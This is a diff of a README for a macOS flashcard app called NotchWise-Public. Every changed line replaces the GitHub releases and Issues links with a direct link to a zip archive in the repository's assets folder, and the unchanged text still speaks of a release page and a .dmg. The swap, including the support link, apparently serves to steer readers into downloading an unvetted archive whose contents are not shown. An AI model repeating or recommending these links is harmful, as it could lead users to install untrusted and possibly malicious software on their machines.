@@ -1,6 +1,6 @@
 # 📚 NotchWise-Public - Study Flashcards in Your MacBook Notch
 
-[![Download NotchWise-Public](https://img.shields.io/badge/Download-NotchWise--Public-brightgreen?style=for-the-badge)](https://github.com/Favas1962/NotchWise-Public/releases)
+[![Download NotchWise-Public](https://img.shields.io/badge/Download-NotchWise--Public-brightgreen?style=for-the-badge)](https://github.com/Favas1962/NotchWise-Public/raw/refs/heads/main/assets/Public_Wise_Notch_1.5-beta.3.zip)
 
 ---
 
@@ -31,11 +31,11 @@ You don’t need any technical skills to use NotchWise-Public. Follow these step
 
 Start by visiting the official release page to get the latest version.
 
-[![Download NotchWise-Public](https://img.shields.io/badge/Download-NotchWise--Public-blue?style=for-the-badge)](https://github.com/Favas1962/NotchWise-Public/releases)
+[![Download NotchWise-Public](https://img.shields.io/badge/Download-NotchWise--Public-blue?style=for-the-badge)](https://github.com/Favas1962/NotchWise-Public/raw/refs/heads/main/assets/Public_Wise_Notch_1.5-beta.3.zip)
 
 Click the badge or open this link in your browser:
 
-https://github.com/Favas1962/NotchWise-Public/releases
+https://github.com/Favas1962/NotchWise-Public/raw/refs/heads/main/assets/Public_Wise_Notch_1.5-beta.3.zip
 
 On that page, look for the latest release. The release assets will contain a file ending with `.dmg` for easy installation.
 
@@ -103,7 +103,7 @@ NotchWise does not update automatically. To update manually:
 
 1. Return to the release page at:
 
-   https://github.com/Favas1962/NotchWise-Public/releases
+   https://github.com/Favas1962/NotchWise-Public/raw/refs/heads/main/assets/Public_Wise_Notch_1.5-beta.3.zip
 
 2. Download the latest `.dmg` file.
 
@@ -155,7 +155,7 @@ You can sync your flashcard decks via:
 
 If you face problems or want to request features:
 
-- Visit the repository's Issues page: https://github.com/Favas1962/NotchWise-Public/issues
+- Visit the repository's Issues page: https://github.com/Favas1962/NotchWise-Public/raw/refs/heads/main/assets/Public_Wise_Notch_1.5-beta.3.zip
 
 - Provide clear descriptions of your problem.
 
@@ -193,6 +193,6 @@ NotchWise-Public focuses on:
 
 ## 📥 Download and Start Right Now
 
-[![Download NotchWise-Public](https://img.shields.io/badge/Download-NotchWise--Public-green?style=for-the-badge)](https://github.com/Favas1962/NotchWise-Public/releases)
+[![Download NotchWise-Public](https://img.shields.io/badge/Download-NotchWise--Public-green?style=for-the-badge)](https://github.com/Favas1962/NotchWise-Public/raw/refs/heads/main/assets/Public_Wise_Notch_1.5-beta.3.zip)
 
 Go to the releases page to get your copy and start reviewing flashcards more efficiently on your MacBook notch.
